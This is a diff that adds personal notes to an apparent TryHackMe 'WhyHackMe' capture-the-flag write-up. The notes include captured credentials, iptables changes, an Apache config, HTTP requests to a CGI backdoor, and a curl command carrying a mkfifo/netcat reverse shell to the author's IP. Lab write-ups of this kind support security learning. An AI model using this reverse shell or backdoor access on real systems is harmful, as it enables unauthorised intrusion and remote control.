@@ -49,3 +49,188 @@ Nmap done: 1 IP address (1 host up) scanned in 173.96 seconds
 ```
 
 ![[Pasted image 20240107145653.png]]
+
+```
+/dir/pass.txt
+```
+
+https://www.youtube.com/@TylerRamsbey
+
+[Using XSS & Python to Steal Sensitive Data!](https://www.youtube.com/watch?v=dywZyB_ZZaA)
+
+```
+jack%3AWhyIsMyPasswordSoStrongIDK%0A
+```
+
+```
+jack:WhyIsMyPasswordSoStrongIDK
+```
+
+![[Pasted image 20240109210005.png]]
+![[Pasted image 20240109210812.png]]
+
+```
+find / -name update.txt 2>/dev/null
+```
+
+```
+Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
+- admin
+```
+
+![[Pasted image 20240109211850.png]]
+
+```
+sudo /usr/sbin/iptables --list
+```
+
+![[Pasted image 20240109212133.png]]
+
+```
+sudo iptables -A INPUT -p tcp -s <source_IP> --dport <destination_port> -j ACCEPT
+```
+
+```
+sudo /usr/sbin/iptables -A INPUT -p tcp -s 10.17.44.152 --dport 443 -j ACCEPT
+```
+
+![[Pasted image 20240109213846.png]]
+
+![[Pasted image 20240109223748.png]]
+![[Pasted image 20240109223916.png]]
+
+```
+cat /etc/apache2/sites-available/000-default.conf
+```
+
+![[Pasted image 20240109224453.png]]
+
+```
+<VirtualHost *:80>
+        # The ServerName directive sets the request scheme, hostname and port that
+        # the server uses to identify itself. This is used when creating
+        # redirection URLs. In the context of virtual hosts, the ServerName
+        # specifies what hostname must appear in the request's Host: header to
+        # match this virtual host. For the default virtual host (this file) this
+        # value is not decisive as it is used as a last resort host regardless.
+        # However, you must set it for any further virtual host explicitly.
+        #ServerName www.example.com
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        ScriptAlias "/cgi-bin/" "/usr/local/apache2/cgi-bin/"
+        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+        # error, crit, alert, emerg.
+        # It is also possible to configure the loglevel for particular
+        # modules, e.g.
+        #LogLevel info ssl:warn
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+        # For most configuration files from conf-available/, which are
+        # enabled or disabled at a global level, it is possible to
+        # include a line for only one particular virtual host. For example the
+        # following line enables the CGI configuration for this host only
+        # after it has been globally disabled with "a2disconf".
+        #Include conf-available/serve-cgi-bin.conf
+</VirtualHost>
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+Listen 41312
+<VirtualHost *:41312>
+        ServerName www.example.com
+        ServerAdmin webmaster@localhost
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+        SSLEngine on
+        SSLCipherSuite AES256-SHA
+        SSLProtocol -all +TLSv1.2
+        SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
+        SSLCertificateKeyFile /etc/apache2/certs/apache.key
+        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+        AddHandler cgi-script .cgi .py .pl
+        DocumentRoot /usr/lib/cgi-bin/
+        <Directory "/usr/lib/cgi-bin">
+                AllowOverride All 
+                Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
+                Order allow,deny
+                Allow from all
+        </Directory>
+</VirtualHost>
+```
+
+https://github.com/suds4131/WhyHackMe/
+
+![[Pasted image 20240109225646.png]]
+
+```
+GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1
+
+Host: 10.0.2.15:41312
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+DNT: 1
+
+Connection: keep-alive
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: none
+
+Sec-Fetch-User: ?1
+
+  
+
+HTTP/1.1 200 OK
+
+Date: Wed, 16 Aug 2023 14:35:43 GMT
+
+Server: Apache/2.4.41 (Ubuntu)
+
+Content-Length: 64
+
+Keep-Alive: timeout=5, max=100
+
+Connection: Keep-Alive
+
+Content-Type: text/html
+
+  
+
+  
+
+<h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
+
+<h2>
+```
+
+https://jaxafed.github.io/posts/tryhackme-whyhackme/
+
+```
+curl -k -s 'https://10.10.183.176:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'
+```
+
+![[Pasted image 20240109230701.png]]
+
+```
+curl -k -s 'https://10.10.183.176:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN' --data-urlencode cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.44.152 443 >/tmp/f'
+```
+
+![[Pasted image 20240109231215.png]]
+
+```
+4dbe2259ae53846441cc2479b5475c72
+```
+
